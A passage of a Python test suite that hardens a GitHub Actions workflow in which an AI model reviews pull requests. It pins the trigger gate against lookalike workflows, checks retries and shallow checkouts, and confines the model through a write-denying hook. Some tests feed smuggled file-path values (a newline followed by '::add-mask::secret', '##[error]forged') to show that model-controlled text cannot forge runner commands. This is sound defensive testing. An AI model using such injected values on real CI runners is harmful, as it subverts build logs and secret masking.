                f"token {i}). That is legal, but this reader models a "
                "comparison as one opaque condition and cannot see the "
                "conditions inside it — teach it, then update this test."
            )
            # The whole comparison, INCLUDING any `!` on either operand, is one
            # opaque condition: `!a == b` is not the negation of `a == b`.
            return ("atom", " ".join(toks[start:j])), j
        return lhs, i

    def and_(i):
        node, i = cmp(i)
        while i < len(toks) and toks[i] == "&&":
            rhs, i = cmp(i + 1)
            node = ("and", node, rhs)
        return node, i

    def or_(i):
        node, i = and_(i)
        while i < len(toks) and toks[i] == "||":
            rhs, i = and_(i + 1)
            node = ("or", node, rhs)
        return node, i

    assert toks, "the `if:` expression is empty"
    tree, i = or_(0)
    assert i == len(toks), f"trailing tokens in the `if:`: {toks[i:]}"
    return tree


def expr_atoms(node) -> set[str]:
    if node[0] == "atom":
        return {node[1]}
    if node[0] == "not":
        return expr_atoms(node[1])
    return expr_atoms(node[1]) | expr_atoms(node[2])


def eval_expr(node, env: dict) -> bool:
    if node[0] == "atom":
        # `true` and `false` are the literals, not free variables — otherwise a
        # gate wired to `false &&` would look satisfiable.
        return {"true": True, "false": False}.get(node[1], env.get(node[1], False))
    if node[0] == "not":
        return not eval_expr(node[1], env)
    if node[0] == "and":
        return eval_expr(node[1], env) and eval_expr(node[2], env)
    return eval_expr(node[1], env) or eval_expr(node[2], env)


def job_if(job: str) -> str:
    """The JOB-level `if:` expression — block or plain, `${{ }}` unwrapped.

    Indent-scoped to the job's own keys, so a step's `if:` cannot stand in for
    the gate, and asserted unique rather than taking the first match.

    A PLAIN scalar continues onto following more-indented lines and YAML folds
    them with a space, so `if: <pin>` with an indented `|| true` under it is the
    single value `<pin> || true`. Reading the key's own line only returned the
    pin and reported a gate that does not exist.
    """
    lines = job.splitlines()
    pat = _key_re("if")
    hits = [
        (i, m)
        for i, ln in enumerate(lines)
        if (m := pat.match(ln)) and len(ln) - len(ln.lstrip()) == 4
    ]
    assert len(hits) == 1, f"premise changed: {len(hits)} job-level `if:` keys"
    i, m = hits[0]
    header = BLOCK_HEADER.fullmatch(uncommented(m.group(1)))
    body = []
    for nxt in lines[i + 1 :]:
        if nxt.strip() and len(nxt) - len(nxt.lstrip()) <= 4:
            break
        if nxt.strip():
            body.append(nxt.rstrip())
    # A GHA string literal may not SPAN lines here. The reader joins the
    # scalar's lines with a space, which is right for a plain scalar and wrong
    # inside a literal block, where YAML keeps the newline as part of the
    # string — so `'a<newline>b' == 'a b'` is false to GitHub and true to a
    # reader that folded it. Refused rather than mis-read.
    #
    # BODY LINES ONLY. The key's own line carries no expression content when it
    # is a block header, and counting its apostrophes red the file over an
    # ordinary comment: `if: | # Don't weaken this guard`.
    for ln in body:
        assert ln.count("'") % 2 == 0, (
            f"a string literal in the job-level `if:` spans lines ({ln.strip()!r}); "
            "this reader folds them and would change what the string contains."
        )
    if header:
        # Inside a LITERAL block, `#` is content, not a comment.
        assert body, "the job-level `if:` block is empty"
        value = " ".join(ln.strip() for ln in body)
    else:
        # FOLD FIRST, THEN DECODE — one scalar, one decoding. Decoding each
        # line on its own unquoted a continuation's own GHA string literal, so
        # the truthy `'false'` in `pin || 'false'` became the FALSE literal and
        # a gate that admits every path read as binding.
        #
        # A plain scalar's trailing ` #` IS a comment, dropped by the
        # quote-aware `uncommented`; `plain_scalar` also unwraps a quoted whole
        # gate, which YAML decodes away and which otherwise left every
        # condition unrecognizable.
        value = plain_scalar(" ".join([m.group(1)] + [ln.strip() for ln in body]))
    # An undecoded YAML double quote is refused in `_lex_expr`, per TOKEN, so
    # that a `"` inside a GHA string literal stays the ordinary character it is.
    wrapped = re.fullmatch(r"\$\{\{(.*)\}\}", value.strip(), re.S)
    return (wrapped.group(1) if wrapped else value).strip()


class TestStage2CannotBeTriggeredByALookalikeWorkflow(unittest.TestCase):
    """`workflows:` matches by NAME, and a pull request can claim a name.

    Stage 1's file comes from the PR's own ref, so a PR may add a second
    workflow also called "Hardened PR Review". Without a path condition that
    lookalike triggers Stage 2 and supplies the request artifact.
    """

    PIN = (
        r"github\.event\.workflow\.path\s*==\s*"
        r"'\.github/workflows/hardened-pr-review\.yml'"
    )

    def test_prepare_pins_the_triggering_workflow_path(self):
        # Comments stripped and the whole equality matched: asserting the two
        # strings separately passed on `!=`, and on prose in a comment.
        #
        # The WHOLE prepare job, not "the text before `runs-on:`": narrowing
        # the region made the test depend on job-key ORDER, so moving an
        # unchanged `runs-on:` above `if:` emptied the region and red it.
        prepare = strip_comments(job_block(STAGE2.read_text(), "prepare"))
        self.assertRegex(
            prepare,
            self.PIN,
            "prepare no longer pins which workflow file may trigger it",
        )

    def test_the_pin_is_binding_and_not_merely_present(self):
        """Present is not the same contract, and the gap is the whole control.

        A text search is satisfied by a pin that decides nothing: demote it
        behind a top-level `||`, negate it as `!(pin)`, or move it out of `if:`
        into a quoted job `name:`, and the assertion above stays green while
        the gate admits a lookalike workflow. Two earlier attempts to close
        this SYNTACTICALLY each red a legal edit instead — a paren-counting
        rule broke on `'(' == '('`, and a no-`||` rule rejected the perfectly
        good `(a || b) && pin`.

        So this EVALUATES the gate rather than pattern-matching it. The `if:`
        is read as a propositional formula whose conditions are opaque, and the
        contract is: no combination of the other conditions can let a run
        through unless THIS COMPARISON holds. Extra conjuncts, grouped
        alternatives and a repeated pin all satisfy that and stay green.

        TWO limits, stated because neither is closed here. The guarantee is
        only as strong as the comparison it depends on, and GitHub's `==`
        IGNORES CASE (docs.github.com, "Evaluate expressions": *"GitHub ignores
        case when comparing strings"*), so a workflow added at a path differing
        only in case satisfies the gate — a defect in the workflow YAML, not in
        this test, and not one the expression language can fix. And the parser
        FAILS CLOSED rather than completely: a handful of legal spellings it
        does not model (index syntax, a comparison over a parenthesized group)
        red with a message naming the limitation instead of being read wrong.
        """
        expr = job_if(job_block(STAGE2.read_text(), "prepare"))
        tree = parse_bool_expr(expr)
        atoms = expr_atoms(tree)
        pinned = [a for a in atoms if re.fullmatch(self.PIN, a)]
        # FAIL CLOSED on a spelling this reader cannot model. Without this, a
        # workflow-path comparison folded into something unrecognizable — `!pin
        # == x`, a comparison over a group — reports "no pin" with a message
        # about the gate being gone, which reads like a different defect.
        if not pinned:
            self.assertNotRegex(
                expr,
                self.PIN,
                f"prepare's gate mentions the workflow path but not as a "
                f"condition this reader can evaluate: {expr!r}. Either the pin "
                f"no longer binds, or it is spelled in a way the parser above "
                f"does not model — establish which, then teach the parser.",
            )
        self.assertEqual(
            len(pinned),
            1,
            f"expected exactly one workflow-path condition in prepare's `if:`, "
            f"found {pinned} in {expr!r}. Two of them means a second file may "
            f"trigger this workflow; none means the gate is elsewhere or gone.",
        )
        pin = pinned[0]
        others = sorted(atoms - {pin, "true", "false"})
        self.assertLessEqual(
            len(others), 12, f"too many conditions to enumerate: {others}"
        )
        cases = list(itertools.product([False, True], repeat=len(others)))
        for bits in cases:
            env = dict(zip(others, bits))
            env[pin] = False
            self.assertFalse(
                eval_expr(tree, env),
                f"prepare's gate admits a run whose workflow path is NOT "
                f"{'.github/workflows/hardened-pr-review.yml'!r}, given "
                f"{env}. The pin is present but not binding, so a pull "
                f"request can add a second workflow with the same NAME and "
                f"drive Stage 2 with an artifact of its choosing.",
            )
        # The converse, to the limited extent opaque atoms can establish it: a
        # gate wired to a literal `false` can never run, and a review that
        # silently stops happening looks exactly like a clean one. This catches
        # the CONSTANT, not the semantically impossible — `&& (1 == 2)` is one
        # opaque atom here and passes. It is a liveness backstop, not a proof.
        self.assertTrue(
            any(
                eval_expr(tree, {**dict(zip(others, bits)), pin: True})
                for bits in cases
            ),
            f"prepare's gate ({expr!r}) is unsatisfiable on its literals alone "
            f"— the job can never run",
        )

    # --- and the same pin decided BYTE-EXACTLY, in shell -------------------
    #
    # Everything above establishes that the expression binds. It cannot make
    # the expression discriminate: GitHub's `==` ignores case, so a second
    # default-branch workflow at `.github/workflows/Hardened-pr-review.yml`
    # satisfies a binding pin. Shell `=` does not, so `prepare`'s first step
    # re-derives the comparison and the two tests below hold it to that.

    EXPECTED_PATH = ".github/workflows/hardened-pr-review.yml"
    STEP_NAME = "Re-derive the triggering workflow path"

    def _rederive_step(self) -> str:
        """`prepare`'s first step ENTRY, required to be the path gate.

        ENTRY, not "the text after the first `- name:`". Splitting on the name
        marker skips an UNNAMED entry entirely, so `- run: echo BEFORE_THE_GATE`
        — or an unnamed checkout — runs ahead of the gate while this helper
        happily reports the gate as first. Any list marker at the steps indent
        starts an entry here, whatever follows it, which turns a spelling this
        reader cannot model into a LOUD failure rather than a step nothing
        enumerated. Same reasoning, same shape, as
        `TestStage1RunsNoPullRequestContent._step_entries`.
        """
        prepare = job_block(STAGE2.read_text(), "prepare")
        lines = prepare.split("steps:", 1)[1].splitlines()
        starts = [i for i, ln in enumerate(lines) if re.match(r"^      -(\s|$)", ln)]
        self.assertTrue(starts, "premise changed: no step entries found in `prepare`")
        bounds = starts + [len(lines)]
        first = "\n".join(lines[starts[0] : bounds[1]])
        body = [ln for ln in first.splitlines() if ln.strip()]
        head = body[0]
        # A bare `-` puts the mapping on the NEXT line.
        if head.rstrip() == "      -" and len(body) > 1:
            head = "      - " + body[1].lstrip()
        m = re.match(r"^      -\s+name:\s*(\S.*)$", head)
        self.assertIsNotNone(
            m,
            f"prepare's FIRST step entry is not a named step ({head.strip()!r}); "
            "something runs before the byte-exact path check.",
        )
        self.assertEqual(
            plain_scalar(m.group(1)),
            self.STEP_NAME,
            f"prepare's first step is not {self.STEP_NAME!r}; the byte-exact "
            f"path check no longer runs before the checkout.",
        )
        return first

    def test_nothing_in_prepare_executes_outside_its_steps(self):
        """Entry zero being the gate says nothing about what runs before step 1.

        Two job keys defeat it, and both survived the whole suite when this was
        only about step ORDER. A `container:` image's entrypoint runs before any
        step. `defaults.run.shell` is the worse one: it replaces the interpreter
        for every `run:` in the job, so the gate's body is no longer executed by
        bash at all — and `test_only_the_exact_path_is_accepted` would go on
        measuring a program CI never runs, green throughout. `prepare` is the
        job holding `secrets.GITHUB_TOKEN`, `pull-requests: read` and
        `id-token: write`, so this is the job where that matters most.

        Both scopes and both spellings, via the shared reader — an earlier
        version of this test scanned only the text before `jobs:` and matched
        an unquoted key, and a `defaults:` block placed after the jobs mapping
        or written `"defaults":` went straight past it.
        """
        # EVERY JOB, enumerated rather than named. The first version covered
        # `prepare` alone, and `review` is the job that most needs it: a
        # `defaults.run.shell` there no-ops "Remove symlinks that escape the PR
        # tree", which is the ONLY control keeping the model's `Read` grant
        # inside `pr/` — and `test_symlink_scrub.py` would keep passing, since
        # it runs the extracted text under its own bash. A `container:` on
        # `review` would equally neuter harden-runner's egress block, which
        # cannot apply from inside a job container. `publish` holds
        # `pull-requests: write`. Looping means a job added later is covered by
        # construction instead of by someone remembering this list.
        text = STAGE2.read_text()
        # EVERY header at the job indent, then FAIL CLOSED on one this reader
        # cannot model. A lowercase-only pattern silently skipped a perfectly
        # legal `Audit:` — the count still passed, the new job went unguarded,
        # and "covered by construction" was false.
        after = strip_comments(text).split("\njobs:", 1)[1]
        # EVERY line at the job indent is a header candidate, and one that is
        # not a plain block header is a FAILURE rather than a skip. Matching
        # headers with a regex and scanning only the matches left the flow
        # spelling — `Audit: {runs-on: ubuntu-latest, container: alpine}` —
        # matching nothing at all, so the job did not appear in `headers`, the
        # count of the three known jobs still passed, and the equality check
        # below had nothing to compare. Measured, twice in two rounds: this is
        # the same hole as the trailing comment, one spelling further out.
        candidates = [ln for ln in after.splitlines() if re.match(r"^  \S", ln)]
        headers, unmodelled = [], []
        for ln in candidates:
            m = re.match(rf"^  (\S.*?):{HEADER_TAIL}", ln)
            (headers.append(m.group(1)) if m else unmodelled.append(ln))
        self.assertEqual(
            unmodelled,
            [],
            f"Stage 2 has a line at the job indent that is not a plain block "
            f"header ({unmodelled}); whatever it declares goes unguarded.",
        )
        jobs = [h for h in headers if re.fullmatch(r"[A-Za-z_][\w-]*", h)]
        self.assertEqual(
            sorted(headers),
            sorted(jobs),
            f"Stage 2 declares a job id this reader cannot model "
            f"({sorted(set(headers) - set(jobs))}); it would go unguarded.",
        )
        self.assertGreaterEqual(
            len(jobs), 3, f"premise changed: Stage 2 jobs are {jobs}"
        )
        for job in jobs:
            with self.subTest(job=job):
                refuse_execution_outside_steps(self, text, job)

    def test_the_path_is_re_derived_in_shell_before_anything_else_runs(self):
        step = self._rederive_step()
        refuse_disabling_keys(self, step, "the path gate")
        # Through `env:`, never interpolated into the script — the same rule
        # Stage 1 lives by, and here it also keeps the value out of the shell's
        # parser, where a crafted path could otherwise end the command.
        #
        # COMMENTS STRIPPED FIRST. Reading the raw step let a COMMENTED-OUT
        # binding satisfy this while the live `env:` set the variable to the
        # expected path as a literal — the shell gate then compared the
        # constant with itself and the provenance check was gone, with all 323
        # tests green. Measured.
        bindings = [
            uncommented(m.group(1))
            for ln in strip_comments(step).splitlines()
            if (m := _key_re("TRIGGERING_WORKFLOW_PATH").match(ln.strip()))
        ]
        self.assertEqual(
            bindings,
            ["${{ github.event.workflow.path }}"],
            f"the path gate binds TRIGGERING_WORKFLOW_PATH to {bindings}. "
            "Anything else — a literal, or the expression demoted to a "
            "trailing comment — makes the shell compare a constant with "
            "itself and the provenance check is gone.",
        )
        # A LITERAL block, not a folded one. `run: >` joins the three
        # same-indent lines into `set -euo pipefail EXPECTED=... [ ... ]`, which
        # `set` swallows as positional parameters and returns 0 from — the gate
        # then compares nothing and every assertion here still passes. Measured.
        header, _ = block_scalars(step, "run")[0]
        self.assertRegex(
            header.lstrip("!").replace("str", "").strip(),
            r"^\|[-+]?$",
            f"the path gate's `run:` is not a plain literal block ({header!r}); "
            "YAML folding turns the whole comparison into arguments to `set`.",
        )
        body = textwrap.dedent(scalar_block(step, "run"))
        self.assertNotIn(
            "${{", body, "the workflow path is interpolated into the script body"
        )
        # `=` inside `[ ]`, not `==` inside `[[ ]]`: the latter is a PATTERN
        # match, so a path containing a glob character would be compared as a
        # pattern rather than as bytes.
        self.assertIn('[ "$TRIGGERING_WORKFLOW_PATH" = "$EXPECTED" ]', body)
        # The three spellings of the path must agree, or the pin silently
        # protects a file that does not exist.
        self.assertIn(f"EXPECTED='{self.EXPECTED_PATH}'", body)
        self.assertEqual(
            posixpath.join(".github", "workflows", STAGE1.name),
            self.EXPECTED_PATH,
            "Stage 1 has been renamed; the shell check still names the old path",
        )
        self.assertRegex(
            strip_comments(job_block(STAGE2.read_text(), "prepare")),
            re.escape(f"github.event.workflow.path == '{self.EXPECTED_PATH}'"),
            "the `if:` pin and the shell check name different paths",
        )

    def _execute(self, path: str) -> int:
        body = textwrap.dedent(scalar_block(self._rederive_step(), "run"))
        return subprocess.run(
            ["bash", "-c", body],
            capture_output=True,
            text=True,
            env={"PATH": "/usr/bin:/bin", "TRIGGERING_WORKFLOW_PATH": path},
        ).returncode

    def test_only_the_exact_path_is_accepted(self):
        """RUN it. The structural test above is satisfied by a check whose
        result is discarded, and by one that compares the wrong way round.
        """
        self.assertEqual(
            self._execute(self.EXPECTED_PATH), 0, "the real path is refused"
        )
        for bad, why in [
            (".github/workflows/Hardened-pr-review.yml", "differs only in case"),
            (".github/workflows/hardened-pr-review.yaml", "the other extension"),
            (".github/workflows/hardened-pr-review.yml.yml", "a suffixed lookalike"),
            ("x/.github/workflows/hardened-pr-review.yml", "a prefixed lookalike"),
            (".github/workflows/hardened-pr-review.yml ", "a trailing space"),
            ("", "absent from the payload"),
        ]:
            self.assertNotEqual(
                self._execute(bad),
                0,
                f"prepare accepts a run from {bad!r} ({why}); the shell check "
                f"is not byte-exact, so the case-insensitive `if:` pin is "
                f"still the only thing deciding.",
            )


class TestTheStage1ArtifactDownloadRetries(unittest.TestCase):
    """A miss here skips every downstream step: no review AND no terminal row.

    `actions/download-artifact@v4` carries no retry and intermittently fails to
    find a cross-run artifact that exists. `claude-issue-triage-run.yml` already
    documents that failure in this repository.
    """

    def setUp(self):
        self.prepare = job_block(STAGE2.read_text(), "prepare")

    def _step(self) -> str:
        step = self.prepare.split("Download Stage-1 artifact", 1)[1]
        return step.split("- name:", 1)[0]

    def test_the_download_actually_retries_more_than_once(self):
        # Asserting only that a `for` loop exists is not enough: `for attempt
        # in 1` satisfies that and retries nothing. Read the bound.
        step = self._step()
        attempts = re.search(r"for attempt in ([\d ]+); do", step)
        self.assertIsNotNone(attempts, "the download is not a retry loop")
        bounds = attempts.group(1).split()
        self.assertGreaterEqual(
            len(bounds), 3, f"only {len(bounds)} attempt(s); that is not a retry"
        )
        self.assertIn("gh run download", step)
        self.assertIn("sleep", step)

    def test_an_exhausted_retry_fails_the_job_rather_than_continuing(self):
        step = self._step()
        attempts = re.search(r"for attempt in ([\d ]+); do", step).group(1).split()
        # The give-up branch must fire on the LAST attempt. Off by one and the
        # loop falls through silently with no artifact and no row.
        self.assertRegex(step, rf'\[ "\$attempt" -eq {attempts[-1]} \]')
        self.assertIn("::error::", step)
        self.assertIn("exit 1", step)

    # Everything above is structural, and structure cannot see control flow:
    # moving the `echo` and the `break` below the `fi` keeps every assertion
    # above green while the loop makes exactly one attempt and exits 0. So the
    # two below RUN the extracted shell against a stubbed `gh`.

    def _run_script(self, fail_first: int) -> tuple[int, int]:
        """Execute the step with a `gh` that fails its first `fail_first` calls.

        Returns (exit status, number of `gh run download` attempts made).
        """
        # Tolerant of the block header's spelling AND of a trailing comment:
        # `run: |-`, `run: |2-` and `run: | # why` all change formatting, not
        # the shell, and an exact `"run: |\n"` split raised IndexError before
        # running anything. That the header is LITERAL rather than folded is
        # pinned by TestTheReadersPremisesStillHold.
        script = textwrap.dedent(scalar_block(self._step(), "run"))
        with tempfile.TemporaryDirectory() as td:
            d = Path(td)
            (d / "count").write_text("0")
            gh = d / "gh"
            gh.write_text(
                "#!/bin/bash\n"
                f"n=$(( $(cat {d}/count) + 1 )); echo $n > {d}/count\n"
                f"[ $n -gt {fail_first} ]\n"
            )
            gh.chmod(0o755)
            # `sleep` stubbed too, or the backoff makes this test take a minute.
            sleep = d / "sleep"
            sleep.write_text("#!/bin/bash\nexit 0\n")
            sleep.chmod(0o755)
            proc = subprocess.run(
                ["bash", "-c", script],
                cwd=td,
                capture_output=True,
                text=True,
                env={
                    **os.environ,
                    "PATH": f"{d}:{os.environ['PATH']}",
                    "GH_TOKEN": "x",
                    "RUN_ID": "1",
                    "REPO": "o/r",
                },
            )
            return proc.returncode, int((d / "count").read_text())

    def test_a_transient_failure_is_actually_retried(self):
        rc, tries = self._run_script(fail_first=2)
        self.assertEqual(rc, 0, "a download that succeeds on attempt 3 failed the step")
        self.assertEqual(tries, 3, f"expected 3 attempts, made {tries}")

    def test_a_persistent_failure_exhausts_the_budget_then_fails(self):
        rc, tries = self._run_script(fail_first=99)
        self.assertNotEqual(rc, 0, "an undownloadable artifact did not fail the step")
        self.assertEqual(tries, 5, f"expected 5 attempts, made {tries}")

    def test_the_unretried_action_is_gone(self):
        # Comments stripped: the retry loop's own comment names the action it
        # replaced, and that prose must not be able to fail this.
        self.assertNotIn("actions/download-artifact", strip_comments(self.prepare))


class TestTheHookLogCannotForgeAWorkflowCommand(unittest.TestCase):
    """The refused write target is model-controlled and reaches the job log.

    The runner parses `::command::` at the start of a line, so a target holding
    a newline would reach that parser even though the write was denied. Denying
    the filesystem operation does not close the output channel. This EXECUTES
    the hook rather than grepping it, because the neutralization has to hold on
    the value, not in the source text.
    """

    def _run(self, file_path: str, log: Path) -> str:
        payload = json.dumps(
            {"tool_name": "Write", "tool_input": {"file_path": file_path}}
        )
        subprocess.run(
            ["bash", str(HOOK)],
            input=payload,
            text=True,
            capture_output=True,
            env={
                **os.environ,
                "PR_REVIEW_HOOK_LOG": str(log),
                "PR_REVIEW_FINDINGS_FILE": "/tmp/allowed.json",
            },
            check=False,
        )
        return log.read_text() if log.exists() else ""

    def test_a_newline_in_the_refused_path_cannot_start_a_log_line(self):
        # The V2 form. actions/runner Runner.Common/ActionCommand.cs
        # TryParseV2 accepts `::cmd::` only when the line starts with it after
        # TrimStart, so this models the parser exactly.
        with tempfile.TemporaryDirectory() as td:
            log = Path(td) / "hooks.log"
            written = self._run("/tmp/x\n::add-mask::secret", log)
        self.assertTrue(written, "the hook logged nothing; premise changed")
        for line in written.splitlines():
            self.assertFalse(
                line.lstrip().startswith("::"),
                f"model-controlled text began a workflow command: {line!r}",
            )

    def test_the_legacy_command_form_is_neutralized_anywhere_in_the_line(self):
        # The V1 form, and the reason position is not a defence. The same file's
        # TryParse uses `IndexOf("##[")`, which matches ANYWHERE in the line, so
        # a `DENY `-prefixed line is no protection against it.
        with tempfile.TemporaryDirectory() as td:
            log = Path(td) / "hooks.log"
            written = self._run("/tmp/x ##[error]forged", log)
        self.assertTrue(written, "the hook logged nothing; premise changed")
        self.assertNotIn("##[", written, "a legacy workflow command survived")

    def test_the_v2_introducer_is_neutralized_mid_line_too(self):
        with tempfile.TemporaryDirectory() as td:
            log = Path(td) / "hooks.log"
            written = self._run("/tmp/x ::add-mask::secret", log)
        self.assertNotIn("::", written, "a `::` introducer survived mid-line")

    def test_the_refused_path_is_still_reported_for_diagnosis(self):
        with tempfile.TemporaryDirectory() as td:
            log = Path(td) / "hooks.log"
            written = self._run("/tmp/somewhere-else.json", log)
        self.assertIn("DENY", written)
        self.assertIn("somewhere-else.json", written)

    def test_the_logged_path_is_bounded(self):
        with tempfile.TemporaryDirectory() as td:
            log = Path(td) / "hooks.log"
            written = self._run("/tmp/" + "a" * 5000, log)
        self.assertTrue(written, "the hook logged nothing; the bound is vacuous")
        self.assertTrue(
            all(len(ln) < 600 for ln in written.splitlines()), written[:200]
        )


class TestTheSizeGateShortCircuitsBeforeTheRunner(unittest.TestCase):
    """The file-count gate is decided in `prepare`, off the API's own count.

    It used to be evaluated five steps into `review`, after a runner, two
    checkouts, two symlink walks and two diffs — all discarded to publish a
    100-byte `skipped_too_large` verdict. `prepare` already holds the PR
    representation that carries `changed_files`.
    """

    def setUp(self):
        self.text = STAGE2.read_text()
        self.stripped = strip_comments(self.text)
        self.prepare = strip_comments(job_block(self.text, "prepare"))

    def test_prepare_reads_changed_files_and_publishes_the_decision(self):
        self.assertIn("changed_files", self.prepare)
        self.assertRegex(self.prepare, r"too_large=true")
        self.assertRegex(self.prepare, r"too_large=false")
        # Exported, or no downstream job can see it.
        self.assertRegex(
            self.prepare, r"too_large:\s*\$\{\{\s*steps\.freshness\.outputs\.too_large"
        )

    def test_the_gate_compares_against_the_same_constant_the_review_uses(self):
        """One constant. Two gates that could disagree are worse than one gate."""
        self.assertIn("MAX_CHANGED_FILES", self.prepare)
        review = strip_comments(job_block(self.text, "review"))
        self.assertIn("MAX_CHANGED_FILES", review)
        # It is a workflow-level env, so both jobs resolve the same value.
        header = self.stripped.split("jobs:", 1)[0]
        caps = env_values(header, "MAX_CHANGED_FILES")
        self.assertEqual(
            len(caps), 1, f"MAX_CHANGED_FILES is a workflow-level env {len(caps)} times"
        )
        self.assertRegex(
            caps[0],
            r"^\d+$",
            f"the workflow-level MAX_CHANGED_FILES is {caps[0]!r}, not a count",
        )

    def test_both_downstream_jobs_stand_down_when_prepare_says_too_large(self):
        """`publish` too: it is `always()`, so skipping `review` is not enough."""
        for job in ("review", "publish"):
            # `job_if`, not `block.split("runs-on:")[0]`. YAML mappings are
            # unordered, so moving an unchanged `runs-on:` above `if:` emptied
            # that region and red the test — the identical defect already found
            # and fixed one class away, not carried here.
            block = strip_comments(job_block(self.text, job))
            self.assertIn(
                "needs.prepare.outputs.too_large != 'true'",
                " ".join(job_if(block).split()),
                f"{job} would still run on the oversized path",
            )

    def test_prepare_writes_the_terminal_row_on_that_path(self):
        """Otherwise the attempt is a `started` with no terminal — a runner death.

        Scoped to the oversized step's own block. Asserting `--phase terminal`
        against the whole job passed by borrowing it from the stale close-out,
        which is the "test cannot fail" shape this suite exists to refuse.
        """
        # Bounded by the next STEP or the next JOB — this is the last step in
        # `prepare`, so stopping only at `- name:` ran on into `review:`.
        block = job_block(self.text, "prepare")
        i = block.index("Close out an oversized request")
        rest = block[i:]
        nxt = rest.find("\n      - name:", 1)
        block = rest if nxt == -1 else rest[:nxt]
        body = textwrap.dedent(scalar_block(block, "run"))
        # The runner expands `${{ ... }}` before bash ever sees it; bash reads
        # it as a bad substitution. Render them the way Actions would.
        body = re.sub(r"\$\{\{[^}]*\}\}", "CTX", body)
        with tempfile.TemporaryDirectory() as td:
            bin_dir = Path(td) / "bin"
            bin_dir.mkdir()
            log = Path(td) / "argv.log"
            # Record what the emitter and the uploader were actually asked for.
            # An assertion on the TEXT passes when the flag is moved into a
            # trailing `#` comment, because `strip_comments` drops whole-line
            # comments only. Running it does not.
            (bin_dir / "python3").write_text(
                f'#!/bin/bash\nprintf "%s\\n" "$*" >> {log}\n'
                'for a in "$@"; do case "$a" in --out) n=1 ;; '
                'esac; done\necho "{}" > terminal.json\nexit 0\n'
            )
            (bin_dir / "aws").write_text(
                f'#!/bin/bash\nprintf "aws %s\\n" "$*" >> {log}\nexit 0\n'
            )
            for f in ("python3", "aws"):
                (bin_dir / f).chmod(0o755)
            proc = subprocess.run(
                ["bash", "-c", body],
                capture_output=True,
                text=True,
                cwd=td,
                env={
                    "PATH": f"{bin_dir}:/usr/bin:/bin",
                    "S3_BUCKET": "b",
                    "S3_PREFIX": "p",
                },
            )
            recorded = log.read_text() if log.exists() else ""
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertIn("--phase terminal", recorded)
        self.assertIn("--status skipped_too_large", recorded)
        self.assertNotIn("--status skipped_stale", recorded)
        self.assertRegex(recorded, r"aws s3 cp terminal\.json")


class TestThePrCheckoutIsNotAFullClone(unittest.TestCase):
    """`fetch-depth: 0` on pytorch/pytorch is several GB, fetched every review.

    What the review needs from history is one commit — the fork point. It is
    resolved by the API in `prepare`, on complete history, and fetched here at
    depth 1. The review job must never compute it itself: `git merge-base` in a
    shallow clone can return an older ancestor with exit status 0, and a
    wrong-but-successful fork point yields a wrong diff rather than an error.
    """

    def setUp(self):
        self.text = STAGE2.read_text()
        self.review = job_block(self.text, "review")
        self.stripped = strip_comments(self.review)
        self.prepare = strip_comments(job_block(self.text, "prepare"))

    def _step(self, marker: str, hay: str | None = None) -> str:
        hay = self.stripped if hay is None else hay
        i = hay.index(marker)
        rest = hay[i:]
        nxt = rest.find("\n      - name:", 1)
        return rest if nxt == -1 else rest[:nxt]

    def test_the_untrusted_checkout_is_shallow(self):
        block = self._step("Untrusted checkout")
        self.assertRegex(block, r"fetch-depth:\s*1\b")
        self.assertNotRegex(block, r"fetch-depth:\s*0\b")

    def test_no_checkout_in_the_review_job_asks_for_full_history(self):
        self.assertNotRegex(self.stripped, r"fetch-depth:\s*0\b")

    def test_the_review_job_never_computes_the_merge_base_itself(self):
        """The whole point of resolving it upstream; a shallow one can be wrong."""
        self.assertNotIn("merge-base", self.stripped)
        self.assertNotIn("--deepen", self.stripped)
        self.assertNotIn("--unshallow", self.stripped)

    def test_prepare_resolves_it_from_the_compare_endpoint_and_validates_it(self):
        self.assertIn("merge_base_commit.sha", self.prepare)
        self.assertRegex(self.prepare, r"/compare/")
        self.assertRegex(
            self.prepare, r'"merge_base_sha=\$MERGE_BASE"\s*>>\s*"\$GITHUB_OUTPUT"'
        )

    def _run_corroboration(self, merge_base: str, td: str, **identities):
        return run_corroboration(merge_base, td, **identities)

    def test_a_malformed_merge_base_aborts_the_run(self):
        """Executed, not matched: a `#`-commented-out guard passes a text test."""
        for bad in ("", "null", "not-a-sha", "a" * 39):
            with tempfile.TemporaryDirectory() as td:
                proc, _out, _argv = self._run_corroboration(bad, td)
            self.assertNotEqual(proc.returncode, 0, f"merge base {bad!r} was accepted")
            self.assertIn("no usable merge base", proc.stdout + proc.stderr)

    def test_a_well_formed_merge_base_is_exported(self):
        with tempfile.TemporaryDirectory() as td:
            proc, out, _argv = self._run_corroboration("c" * 40, td)
            written = out.read_text()
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertEqual(
            sole_outputs(self, written).get("merge_base_sha"),
            "c" * 40,
            f"the step wrote {written!r} for merge_base_sha",
        )

    def test_the_recorded_base_is_the_base_and_not_the_head(self):
        """`base_sha` selects what the review is shown a diff AGAINST.

        Nothing checked which field it came from. Extracting `.head.sha` where
        the step means `.base.sha` records the head as the base AND asks
        `compare` for `head...head`, whose merge base is the head itself — so
        the review sees an empty diff and reports no findings on a real change.
        Both halves are pinned, against distinct stub values.
        """
        with tempfile.TemporaryDirectory() as td:
            proc, out, argv = self._run_corroboration("c" * 40, td)
            written, calls = out.read_text(), argv.read_text()
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertEqual(
            sole_outputs(self, written).get("base_sha"),
            STUB_API_BASE,
            f"the step recorded {written!r} as its base sha; it must be the "
            "API's `.base.sha` and nothing else.",
        )
        # THE CALLS, as (endpoint, --jq filter). Both halves matter: the
        # endpoint decides WHICH history the fork point is computed on, and the
        # filter decides whether `$MERGE_BASE` is a sha or the whole comparison
        # document. Recorded as two fields so a legal reordering of `gh`'s own
        # arguments is not a difference.
        self.assertEqual(
            [tuple(ln.split("\t")) for ln in calls.splitlines()],
            [
                ("repos/o/r/pulls/1", ""),
                (
                    f"repos/o/r/compare/{STUB_API_BASE}...{STUB_API_HEAD}?per_page=1",
                    ".merge_base_commit.sha",
                ),
            ],
            f"the step called {calls!r}; it must corroborate the claimed PR "
            "and then resolve the fork point of the corroborated base and "
            "head, selecting the merge-base commit out of the answer.",
        )

    def test_the_merge_base_reaches_the_review_job_as_an_output(self):
        self.assertRegex(
            self.stripped,
            r"MERGE_BASE_SHA:\s*\$\{\{\s*needs\.prepare\.outputs\.merge_base_sha\s*\}\}",
        )

    def test_the_diff_is_taken_against_the_resolved_merge_base(self):
        """Two-dot against the fork point — three-dot would recompute it here."""
